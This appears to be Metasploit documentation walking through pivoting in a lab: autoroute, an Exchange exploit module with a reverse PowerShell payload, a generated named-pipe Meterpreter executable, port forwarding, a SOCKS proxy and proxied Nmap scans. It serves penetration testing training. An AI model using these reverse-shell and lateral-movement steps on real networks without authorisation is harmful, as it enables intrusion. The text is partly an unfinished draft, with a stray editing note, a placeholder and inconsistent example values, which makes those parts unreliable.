## Overview

Whilst in test environments one is often looking at flat networks that only have one subnet and one network environment, the reality is that when it comes to pentests that are attempting to compromise an entire company, you will often have to deal with multiple networks, often with switches or firewalls in-between that are intended to keep these networks separate from one another.

In order for pivoting to work, you must have compromised a host that is connected to two or more networks. This usually means that the host has two or more network adapters, whether that be physical network adapters, virtual network adapters, or a combination of both.

Once you have compromised a host that has multiple network adapters you can then use the session that you have obtained on that host to use that host as a pivot, and relay traffic through the compromised host to the target machine that you want to access. This allows you, as an attacker, to access machines on networks that you might not otherwise have access to, by utilizing the access to internal networks that the compromised machine has.

Now that we understand some of the background, lets see this in action a bit more by setting up a sample environment and walking through some of Metasploit's pivoting features.

## Supported Session Types

Pivoting functionality is provided by all Meterpreter and SSH sessions that occur over TCP channels. Whilst Meterpreter is mentioned below, keep in mind that this would also work with an SSH session as well. We have just resorted to using Meterpreter for this example for demonstration purposes.

## Testing Pivoting

### Target Environment Setup

- Kali Machine
	- Internal: None
	- External: 172.19.182.171
- Windows 11 Machine (used as pivot)
	- Internal: 169.254.16.221
	- External: 172.19.185.34
- Windows Server 2019 Machine (final target)
	- Internal: 169.254.204.110
	- External: None

For the purpose of simplicity we will assume we have a session on the Windows 11 box, which we will use as a pivot to route our traffic through to the Windows Server 2019 box at 169.254.204.110.

There a few ways to register this route in Metasploit so that it knows how to redirect traffic appropriately. Lets take a look at these methods.

## AutoRoute
One of the easiest ways to do this is to use the `post/multi/manage/autoroute` module which will help us automatically add in routes for the target to Metasploit's routing table so that Metasploit knows how to route traffic through the session that we have on the Windows 11 box and to the target Windows Server 2019 box. Lets look at a sample run of this command:

```msf
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > use post/multi/manage/autoroute
msf6 post(multi/manage/autoroute) > show options

Module options (post/multi/manage/autoroute):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CMD      autoadd          yes       Specify the autoroute command (Accepted: add, auto
                                       add, print, delete, default)
   NETMASK  255.255.255.0    no        Netmask (IPv4 as "255.255.255.0" or CIDR as "/24"
   SESSION                   yes       The session to run this module on
   SUBNET                    no        Subnet (IPv4, for example, 10.10.10.0)

msf6 post(multi/manage/autoroute) > set SESSION 1
SESSION => 1
msf6 post(multi/manage/autoroute) > set SUBNET 169.254.0.0
SUBNET => 169.254.0.0
msf6 post(multi/manage/autoroute) > set NETMASK /16
NETMASK => /16
msf6 post(multi/manage/autoroute) > show options

Module options (post/multi/manage/autoroute):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CMD      autoadd          yes       Specify the autoroute command (Accepted: add, auto
                                       add, print, delete, default)
   NETMASK  /16              no        Netmask (IPv4 as "255.255.255.0" or CIDR as "/24"
   SESSION  1                yes       The session to run this module on
   SUBNET   169.254.0.0      no        Subnet (IPv4, for example, 10.10.10.0)

msf6 post(multi/manage/autoroute) > run

[!] SESSION may not be compatible with this module:
[!]  * incompatible session platform: windows
[*] Running module against WIN11-TEST
[*] Searching for subnets to autoroute.
[+] Route added to subnet 169.254.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 172.19.176.0/255.255.240.0 from host's routing table.
[*] Post module execution completed
msf6 post(multi/manage/autoroute) >
```
If we now use Meterpreter's `route` command we can see that we have two route table entries within Metasploit's routing table, that are tied to Session 1, aka the session on the Windows 11 machine. This means anytime we want to contact a machine within one of the networks specified, we will go through Session 1 and use that to connect to the targets.

```msf
msf6 post(multi/manage/autoroute) > route

IPv4 Active Routing Table
=========================

   Subnet             Netmask            Gateway
   ------             -------            -------
   169.254.0.0        255.255.0.0        Session 1
   172.19.176.0       255.255.240.0      Session 1

[*] There are currently no IPv6 routes defined.
msf6 post(multi/manage/autoroute) >
```

All right so that's one way, but what if we wanted to do this manually? First off to flush all routes from the routing table, we will do `route flush` followed by `route` to double check we have successfully removed the entries.

```msf
msf6 post(multi/manage/autoroute) > route flush
msf6 post(multi/manage/autoroute) > route
[*] There are currently no routes defined.
msf6 post(multi/manage/autoroute) >
```
Now lets trying doing the same thing manually.

## Route
Here we can use `route add <IP ADDRESS OF SUBNET> <NETMASK> <GATEWAY>` to add the routes from within Metasploit, followed by `route print` to then print all the routes that Metasploit knows about. Note that the Gateway parameter is either an IP address to use as the gateway or as is more commonly the case, the session ID of an existing session to use to pivot the traffic through.

```msf
msf6 post(multi/manage/autoroute) > route add 169.254.0.0 255.255.0.0 1
[*] Route added
msf6 post(multi/manage/autoroute) > route add 172.19.176.0 255.255.240 1
[-] Invalid gateway
msf6 post(multi/manage/autoroute) > route add 172.19.176.0 255.255.240.0 1
[*] Route added
msf6 post(multi/manage/autoroute) > route print

IPv4 Active Routing Table
=========================

   Subnet             Netmask            Gateway
   ------             -------            -------
   169.254.0.0        255.255.0.0        Session 1
   172.19.176.0       255.255.240.0      Session 1

[*] There are currently no IPv6 routes defined.
msf6 post(multi/manage/autoroute) >
```

Finally we can check that the route will use session 1 by using `route get 169.254.204.110`

```msf
msf6 post(multi/manage/autoroute) > route get 169.254.204.110
169.254.204.110 routes through: Session 1
msf6 post(multi/manage/autoroute) >
```

If we want to then remove a specific route (such as in this case we want to remove the 172.19.176.0/20 route since we don't need that for this test), we can issue the `route del` or `route remove` commands with the syntax `route remove <IP ADDRESS OF SUBNET><NETMASK IN SLASH FORMAT> <GATEWAY>`

Example:

```msf
msf6 post(multi/manage/autoroute) > route remove 172.19.176.0/20 1
[*] Route removed
msf6 post(multi/manage/autoroute) > route

IPv4 Active Routing Table
=========================

   Subnet             Netmask            Gateway
   ------             -------            -------
   169.254.0.0        255.255.0.0        Session 1

[*] There are currently no IPv6 routes defined.
msf6 post(multi/manage/autoroute) >
```

## Using the Pivot
At this point we can now use the pivot with any Metasploit modules as shown below:

```msf
msf6 exploit(windows/http/exchange_chainedserializationbinder_denylist_typo_rce) > show options

Module options (exploit/windows/http/exchange_chainedserializationbinder_denylist_typo_rce):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   HttpPassword  thePassword      yes       The password to use to authenticate to the Ex
                                            change server
   HttpUsername  administrator    yes       The username to log into the Exchange server
                                            as
   Proxies                        no        A proxy chain of format type:host:port[,type:
                                            host:port][...]
   RHOSTS        169.254.204.110  yes       The target host(s), see https://github.com/ra
                                            pid7/metasploit-framework/wiki/Using-Metasplo
                                            it
   RPORT         443              yes       The target port (TCP)
   SRVHOST       0.0.0.0          yTo come, awaiting some more testing hold on :)es       The local host or network interface to listen
                                             on. This must be an address on the local mac
                                            hine or 0.0.0.0 to listen on all addresses.
   SRVPORT       8080             yes       The local port to listen on.
   SSL           true             no        Negotiate SSL/TLS for outgoing connections
   SSLCert                        no        Path to a custom SSL certificate (default is
                                            randomly generated)
   TARGETURI     /                yes       Base path
   URIPATH                        no        The URI to use for this exploit (default is r
                                            andom)
   VHOST                          no        HTTP server virtual host


Payload options (cmd/windows/powershell_reverse_tcp):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   LHOST         172.19.182.171   yes       The listen address (an interface may be speci
                                            fied)
   LOAD_MODULES                   no        A list of powershell modules separated by a c
                                            omma to download over the web
   LPORT         4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows Command


msf6 exploit(windows/http/exchange_chainedserializationbinder_denylist_typo_rce) > check

[*] Target is an Exchange Server!
[*] 169.254.204.110:443 - The target is not exploitable. Exchange Server 15.2.986.14 does not appear to be a vulnerable version!
msf6 exploit(windows/http/exchange_chainedserializationbinder_denylist_typo_rce) >
```

## SMB Named Pipe Pivoting in Meterpreter

The Windows Meterpreter payload supports lateral movement in a network through SMB Named Pipe Pivoting. No other Meterpreters/session types support this functionality.

First open a Windows Meterpreter session to the pivot machine:

```msf
msf6 > use payload/windows/x64/meterpreter/reverse_tcp
smsf6 payload(windows/x64/meterpreter/reverse_tcp) > set lhost 172.19.182.171
lhost => 172.19.182.171
msf6 payload(windows/x64/meterpreter/reverse_tcp) > set lport 4578
lport => 4578
msf6 payload(windows/x64/meterpreter/reverse_tcp) > to_handler
[*] Payload Handler Started as Job 0

[*] Started reverse TCP handler on 172.19.182.171:4578 
msf6 payload(windows/x64/meterpreter/reverse_tcp) > [*] Sending stage (200774 bytes) to 172.19.185.34
[*] Meterpreter session 1 opened (172.19.182.171:4578 -> 172.19.185.34:49674) at 2022-06-09 13:23:03 -0500
```

Create named pipe pivot listener on the pivot machine, setting `-l` to the pivot's bind address:

```msf
msf6 payload(windows/x64/meterpreter/reverse_tcp) > sessions -i -1
[*] Starting interaction with 1...

meterpreter > pivot add -t pipe -l 169.254.16.221 -n msf-pipe -a x64 -p windows
[+] Successfully created pipe pivot.
meterpreter > background
[*] Backgrounding session 1...
```

Now generate a separate payload that will connect back through the pivot machine. This payload will be executed on the final target machine.  Note there is no need to start a handler for the named pipe payload.

```msf
msf6 payload(windows/x64/meterpreter/reverse_named_pipe) > show options

Module options (payload/windows/x64/meterpreter/reverse_named_pipe):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   PIPEHOST  .                yes       Host of the pipe to connect to
   PIPENAME  msf-pipe         yes       Name of the pipe to listen on

msf6 payload(windows/x64/meterpreter/reverse_named_pipe) > set pipehost 169.254.16.221
pipehost => 169.254.16.221
msf6 payload(windows/x64/meterpreter/reverse_named_pipe) > generate -f exe -o revpipe_meterpreter_msfpipe.exe
[*] Writing 7168 bytes to revpipe_meterpreter_msfpipe.exe...
```

After running the payload on the final target machine a new session will open, via the Windows 11 169.254.16.221 pivot.
```msf
msf6 payload(windows/x64/meterpreter/reverse_named_pipe) > [*] Meterpreter session 2 opened (Pivot via [172.19.182.171:4578 -> 169.254.16.221:49674]) at 2022-06-09 13:34:32 -0500

msf6 payload(windows/x64/meterpreter/reverse_named_pipe) > sessions

Active sessions
===============

  Id  Name  Type                     Information                                Connection
  --  ----  ----                     -----------                                ----------
  1         meterpreter x64/windows  WIN11\msfuser @ WIN11          172.19.182.171:4578 -> 172.19.185.34:49674 (172.19.185.34)
  2         meterpreter x64/windows  WIN2019\msfuser @ WIN2019      Pivot via [172.19.182.171:4578 -> 172.19.185.34:49674]
                                                                                 (169.254.204.110)

```
## Pivoting External Tools

### portfwd
*Note: This method is discouraged as you can only set up a mapping between a single port and another target host and port, so using the socks module below is encouraged where possible. Additionally this method has been depreciated for some time now.*

#### Local Port Forwarding
To set up a port forward using Metasploit, use the `portfwd` command within a supported session's console such as the Meterpreter console. Using `portfwd -h` will bring up a help menu similar to the following:

```msf
meterpreter > portfwd -h
Usage: portfwd [-h] [add | delete | list | flush] [args]


OPTIONS:

    -h   Help banner.
    -i   Index of the port forward entry to interact with (see the "list" command).
    -l   Forward: local port to listen on. Reverse: local port to connect to.
    -L   Forward: local host to listen on (optional). Reverse: local host to connect to.
    -p   Forward: remote port to connect to. Reverse: remote port to listen on.
    -r   Forward: remote host to connect to.
    -R   Indicates a reverse port forward.
meterpreter >
```

To add a port forward, use `portfwd add` and specify the `-l`, `-p` and `-r` options at a minimum to specify the local port to listen on, the report port to connect to, and the target host to connect to respectively.

```msf
meterpreter > portfwd add -l 1090 -p 443 -r 169.254.37.128
[*] Local TCP relay created: :1090 <-> 169.254.37.128:443
meterpreter >
```

Note that something that is commonly misunderstood here is that the port will be opened on the machine running Metasploit itself, NOT on the target that the session is running on.

We can then connect to the target host using the local port on the machine running Metasploit:

```
 ~/git/metasploit-framework │ master ?21  wget --no-check-certificate https://127.0.0.1:1090
--2022-04-08 14:36:23--  https://127.0.0.1:1090/
Connecting to 127.0.0.1:1090... connected.
WARNING: cannot verify 127.0.0.1's certificate, issued by ‘CN=DC1’:
  Self-signed certificate encountered.
    WARNING: certificate common name ‘DC1’ doesn't match requested host name ‘127.0.0.1’.
HTTP request sent, awaiting response... 302 Moved Temporarily
Location: https://127.0.0.1/owa/ [following]
--2022-04-08 14:36:23--  https://127.0.0.1/owa/
Connecting to 127.0.0.1:443... failed: Connection refused.
 ~/git/metasploit-framework │ master ?21
```

Note that you may need to edit your `/etc/hosts` file to map IP addresses to given host names to allow things like redirects to redirect to the right hostname or IP address when using this method of pivoting.

#### Listing Port Forwards and Removing Entries
Can list port forwards using the `portfwd list` command. To delete all port forwards use `portfwd flush`. Alternatively to selectively delete local port forwarding entries, use `portfwd delete -l <local port>`.

```msf
meterpreter > portfwd delete -l 1090
[*] Successfully stopped TCP relay on 0.0.0.0:1090
meterpreter > portfwd list

No port forwards are currently active.

meterpreter >
```

#### Remote Port Forwarding
This scenario is a bit different than above. Whereas previously we were instructing the session to forward traffic from our host running Metasploit, through the session, and to a second target host, with reverse port forwarding the scenario is a bit different. In this case we are instructing the session to forward traffic from other hosts through the session, and to our host running Metasploit. This is useful for allowing other applications running within a target network to interact with local applications on the machine running Metasploit.

To set up a reverse port forward, use `portfwd add -R` within a supported session and then specify the `-l`, `-L` and `-p` options. The `-l` option specifies the port to forward the traffic to, the `-L` option specifies the IP address to forward the traffic to, and the `-p` option specifies the port to listen on for traffic on the machine that we have a session on (whose session console we are currently interacting with).

For example to listen on port 9093 on a target session and have it forward all traffic to the Metasploit machine at 172.20.97.72 on port 9093 we could execute `portfwd add -R -l 4444 -L 172.20.97.73 -p 9093` as shown below, which would then cause the machine who have a session on to start listening on port 9093 for incoming connections.

```msf
meterpreter > portfwd add -R -l 4444 -L 172.20.97.73 -p 9093
[*] Local TCP relay created: 172.20.97.73:4444 <-> :9093
meterpreter > netstat -a

Connection list
===============

    Proto  Local addre  Remote addr  State        User  Inode  PID/Program name
           ss           ess
    -----  -----------  -----------  -----        ----  -----  ----------------
    tcp    0.0.0.0:135  0.0.0.0:*    LISTEN       0     0      488/svchost.exe
    tcp    0.0.0.0:445  0.0.0.0:*    LISTEN       0     0      4/System
    tcp    0.0.0.0:504  0.0.0.0:*    LISTEN       0     0      5780/svchost.exe
           0
    tcp    0.0.0.0:909  0.0.0.0:*    LISTEN       0     0      2116/bind_tcp_x64_4444.exe
           3
```

We can confirm this works by setting up a listener

XXX - to work on and confirm....

## Socks Module
Once routes are established, Metasploit modules can access the IP range specified in the routes. For other applications to access the routes, a little bit more setup is necessary. One way to solve this involves using the `auxiliary/server/socks_proxy` Metasploit module to set up a socks4a proxy, and then using `proxychains-ng` to direct external applications towards the established socks4a proxy server that Metasploit has set up so that external applications can use Metasploit's internal routing table.
### Socks Server Module Setup
Metasploit can launch a SOCKS proxy server using the module: `auxiliary/server/socks_proxy`. When set up to bind to a local loopback adapter, applications can be directed to use the proxy to route TCP/IP traffic through Metasploit's routing tables. Here is an example of how this module might be used:

```msf
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > show options

Module options (auxiliary/server/socks_proxy):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   no        Proxy password for SOCKS5 listener
   SRVHOST   0.0.0.0          yes       The local host or network interface to listen on.
                                         This must be an address on the local machine or
                                        0.0.0.0 to listen on all addresses.
   SRVPORT   1080             yes       The port to listen on
   USERNAME                   no        Proxy username for SOCKS5 listener
   VERSION   5                yes       The SOCKS version to use (Accepted: 4a, 5)


Auxiliary action:

   Name   Description
   ----   -----------
   Proxy  Run a SOCKS proxy server


msf6 auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1
SRVHOST => 127.0.0.1
msf6 auxiliary(server/socks_proxy) > set SRVPORT 1080
SRVPORT => 1080
msf6 auxiliary(server/socks_proxy) > run
[*] Auxiliary module running as background job 0.
msf6 auxiliary(server/socks_proxy) >
[*] Starting the SOCKS proxy server

msf6 auxiliary(server/socks_proxy) > jobs

Jobs
====

  Id  Name                           Payload  Payload opts
  --  ----                           -------  ------------
  0   Auxiliary: server/socks_proxy

msf6 auxiliary(server/socks_proxy) >
```

### proxychains-ng Setup
First, make sure that you have installed `proxychains-ng`. You can also use `proxychains` however most repositories such as Ubuntu will have an outdated version of it and it has crashed before in my tests, so it is highly recommended to use `proxychains-ng` instead which is actively maintained. You can install it with the following commands:

```
git clone https://github.com/rofl0r/proxychains-ng
cd proxychains-ng
make
sudo make install
```

Now edit the `proxychains` configuration file located at `/etc/proxychains.conf`. Add the below line to the end of the file to set `proxychains-ng` to use the SOCKS 5 server that you just set up. Note that you may need to use `sudo` to edit this file due to the default permissions on this file preventing anyone but `root` from writing to it.

```
socks5 127.0.0.1 1080
```

The final final should look something like this:

```ini
# proxychains.conf  VER 3.1
#
#        HTTP, SOCKS4, SOCKS5 tunneling proxifier with DNS.
#

# The option below identifies how the ProxyList is treated.
# only one option should be uncommented at time,
# otherwise the last appearing option will be accepted
#
#dynamic_chain
#
# Dynamic - Each connection will be done via chained proxies
# all proxies chained in the order as they appear in the list
# at least one proxy must be online to play in chain
# (dead proxies are skipped)
# otherwise EINTR is returned to the app
#
strict_chain
#
# Strict - Each connection will be done via chained proxies
# all proxies chained in the order as they appear in the list
# all proxies must be online to play in chain
# otherwise EINTR is returned to the app
#
#random_chain
#
# Random - Each connection will be done via random proxy
# (or proxy chain, see  chain_len) from the list.
# this option is good to test your IDS :)

# Make sense only if random_chain
#chain_len = 2

# Quiet mode (no output from library)
#quiet_mode

# Proxy DNS requests - no leak for DNS data
proxy_dns

# Some timeouts in milliseconds
tcp_read_time_out 15000
tcp_connect_time_out 8000

# ProxyList format
#       type  host  port [user pass]
#       (values separated by 'tab' or 'blank')
#
#
#        Examples:
#
#            	socks5	192.168.67.78	1080	lamer	secret
#		http	192.168.89.3	8080	justu	hidden
#	 	socks4	192.168.1.49	1080
#	        http	192.168.39.93	8080
#
#
#       proxy types: http, socks4, socks5
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5 127.0.0.1 1080
```

Note: If there are other proxy entries in the configuration file, you may need to comment them out as they may interfere with proper routing.

### Using Proxychains-NG
Now you can combine proxychains-ng with other application like Nmap, Nessus, Firefox and more to scan or access machines and resources through the Metasploit routes. All you need to do is call proxychains-ng before the needed application. No need to change the proxy settings in the respective application.

```
 ~/git/metasploit-framework │ master ?21  wget https://169.254.37.128
--2022-04-08 13:52:23--  https://169.254.37.128/
Connecting to 169.254.37.128:443... failed: No route to host.
~/git/proxychains-ng │ master ?1  proxychains4 wget https://169.254.37.128
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/local/lib/libproxychains4.so
[proxychains] DLL init: proxychains-ng 4.16-git-1-g07c15a0
--2022-04-08 14:06:52--  https://169.254.37.128/
Connecting to 169.254.37.128:443... [proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:443  ...  OK
connected.
ERROR: cannot verify 169.254.37.128's certificate, issued by ‘CN=DC1’:
  Self-signed certificate encountered.
    ERROR: certificate common name ‘DC1’ doesn't match requested host name ‘169.254.37.128’.
To connect to 169.254.37.128 insecurely, use `--no-check-certificate'.
 ~/git/proxychains-ng │ master ?1  proxychains4 wget --no-check-certificate https://169.254.37.128
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/local/lib/libproxychains4.so
[proxychains] DLL init: proxychains-ng 4.16-git-1-g07c15a0
--2022-04-08 14:26:53--  https://169.254.37.128/
Connecting to 169.254.37.128:443... [proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:443  ...  OK
connected.
WARNING: cannot verify 169.254.37.128's certificate, issued by ‘CN=DC1’:
  Self-signed certificate encountered.
    WARNING: certificate common name ‘DC1’ doesn't match requested host name ‘169.254.37.128’.
HTTP request sent, awaiting response... 302 Moved Temporarily
Location: https://169.254.37.128/owa/ [following]
--2022-04-08 14:26:53--  https://169.254.37.128/owa/
Connecting to 169.254.37.128:443... [proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:443  ...  OK
connected.
WARNING: cannot verify 169.254.37.128's certificate, issued by ‘CN=DC1’:
  Self-signed certificate encountered.
    WARNING: certificate common name ‘DC1’ doesn't match requested host name ‘169.254.37.128’.
HTTP request sent, awaiting response... 302 Found
Location: https://169.254.37.128/owa/auth/logon.aspx?url=https%3a%2f%2f169.254.37.128%2fowa%2f&reason=0 [following]
--2022-04-08 14:26:54--  https://169.254.37.128/owa/auth/logon.aspx?url=https%3a%2f%2f169.254.37.128%2fowa%2f&reason=0
Reusing existing connection to 169.254.37.128:443.
HTTP request sent, awaiting response... 200 OK
Length: 58714 (57K) [text/html]
Saving to: ‘index.html’

index.html             100%[===========================>]  57.34K  --.-KB/s    in 0.1s

2022-04-08 14:26:54 (573 KB/s) - ‘index.html’ saved [58714/58714]

 ~/git/proxychains-ng │ master ?2
```

### Scanning
For scanning with Nmap, Zenmap, Nessus and others, keep in mind that ICMP and UPD traffic cannot tunnel through the proxy. So you cannot perform ping or UDP scans.

For Nmap and Zenmap, the below example shows the commands can be used. It is best to be selective on ports to scan since scanning through the proxy tunnel can be slow.

```
$ sudo proxychains4 nmap -n -sT -sV -PN -p 445 10.10.125.0/24
```

Here is an example of how this might look when scanning a single host for port 445 over `proxychains-ng`:

```
 ~/git/proxychains-ng │ master ?1  proxychains4 nmap -n -sT -A -PN -p 445 169.254.37.128
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/local/lib/libproxychains4.so
[proxychains] DLL init: proxychains-ng 4.16-git-1-g07c15a0
Starting Nmap 7.80 ( https://nmap.org ) at 2022-04-08 14:08 CDT
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:7458 <--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:42597 <--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:1433 <--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  169.254.37.128:445  ...  OK
Nmap scan report for 169.254.37.128
Host is up (0.14s latency).

PORT    STATE SERVICE       VERSION
445/tcp open  microsoft-ds?

Host script results:
|_clock-skew: -1s
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2022-04-08T19:09:38
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 83.03 seconds
```
